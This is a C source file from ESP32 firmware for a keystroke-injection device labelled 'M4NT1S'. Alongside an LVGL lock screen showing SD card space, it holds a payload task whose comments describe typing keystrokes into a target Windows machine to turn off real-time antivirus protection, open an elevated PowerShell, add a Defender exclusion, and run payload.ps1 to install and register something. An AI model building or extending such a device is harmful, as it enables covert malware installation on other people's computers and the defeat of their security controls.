// main/locked_ui.c
#include "locked_ui.h"
#include "ui.h"
#include "hid_payload.h"
#include "sd_card.h"
#include "status_led.h"
#include "esp_vfs_fat.h"
#include "esp_log.h"
#include "lvgl.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include <stdio.h>
#include <string.h>

#define LOCKED_SD_MOUNT_POINT "/sdcard"

static bool s_locked = false;
static volatile bool s_payload_running = false;
static lv_obj_t *s_locked_screen = NULL;
static lv_obj_t *s_sd_label = NULL;

static void format_free_space(char *out, size_t out_len)
{
    uint64_t total = 0, free_bytes = 0;
    esp_err_t err = esp_vfs_fat_info(LOCKED_SD_MOUNT_POINT, &total, &free_bytes);
    if (err != ESP_OK) {
        snprintf(out, out_len, "No SD Card");
        return;
    }
    double gb = (double)free_bytes / (1024.0 * 1024.0 * 1024.0);
    if (gb >= 1.0) snprintf(out, out_len, "%.1f GB free", gb);
    else snprintf(out, out_len, "%.0f MB free", (double)free_bytes / (1024.0 * 1024.0));
}

bool locked_ui_is_locked(void) { return s_locked; }

void locked_ui_refresh_sd_state(void)
{
    if (!s_sd_label) return;
    char buf[32];
    format_free_space(buf, sizeof(buf));
    lv_label_set_text(s_sd_label, buf);
}

void locked_ui_enter(void)
{
    if (s_locked) return;
    s_locked = true;

    lv_display_t *disp = lv_display_get_default();
    if (disp) lv_display_set_rotation(disp, LV_DISPLAY_ROTATION_90);

    s_locked_screen = lv_obj_create(lv_scr_act());
    lv_obj_set_size(s_locked_screen, LV_PCT(100), LV_PCT(100));
    // The main screen is a flex column (header/body/status). This overlay must
    // not be laid out by it, or it would be placed after the status row and
    // shrink to the leftover space instead of covering the screen.
    lv_obj_set_ignore_layout(s_locked_screen, true);
    lv_obj_set_style_bg_opa(s_locked_screen, LV_OPA_COVER, 0);
    lv_obj_set_style_bg_color(s_locked_screen, lv_color_black(), 0);
    lv_obj_set_style_pad_all(s_locked_screen, 0, 0);
    lv_obj_set_style_border_width(s_locked_screen, 0, 0);
    lv_obj_set_style_radius(s_locked_screen, 0, 0);

    lv_obj_t *title = lv_label_create(s_locked_screen);
    lv_label_set_text(title, "M4NT1S");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_28, 0);
    lv_obj_set_style_text_color(title, lv_color_white(), 0);
    lv_obj_align(title, LV_ALIGN_TOP_MID, 0, 10);

    s_sd_label = lv_label_create(s_locked_screen);
    lv_obj_set_style_text_font(s_sd_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(s_sd_label, lv_color_make(0, 200, 0), 0);
    lv_obj_align(s_sd_label, LV_ALIGN_CENTER, 0, 10);

    locked_ui_refresh_sd_state();
    hid_payload_enable(true);
}

void locked_ui_exit(void)
{
    if (!s_locked) return;
    s_locked = false;
    hid_payload_enable(false);
    if (s_locked_screen) {
        lv_obj_delete(s_locked_screen);
        s_locked_screen = NULL;
        s_sd_label = NULL;
    }
    lv_display_t *disp = lv_display_get_default();
    if (disp) lv_display_set_rotation(disp, LV_DISPLAY_ROTATION_0);
    ui_init();
    ui_draw_menu();
}

static void payload_task(void *arg)
{
    (void)arg;
    vTaskDelay(pdMS_TO_TICKS(1000));

    hid_payload_set_layout(HID_LAYOUT_UK);

    // 1. Disable real-time protection via Settings UI
    hid_payload_disable_realtime_protection();
    vTaskDelay(pdMS_TO_TICKS(1000));

    // 2. Open elevated PowerShell, add exclusion, run payload.ps1
    hid_payload_run_admin_payload();

    // ~30s drive poll + install + first registration
    vTaskDelay(pdMS_TO_TICKS(45000));

    status_led_set_mode(LED_MODE_IDLE);
    s_payload_running = false;
    vTaskDelete(NULL);
}

void locked_ui_trigger_payload(void)
{
    if (!s_locked || !hid_payload_is_enabled() || s_payload_running) {
        status_led_flash_error();
        return;
    }

    s_payload_running = true;
    status_led_set_mode(LED_MODE_ACTIVE);

    xTaskCreatePinnedToCore(payload_task, "hid_payload", 8192, NULL, 5, NULL, 1);
}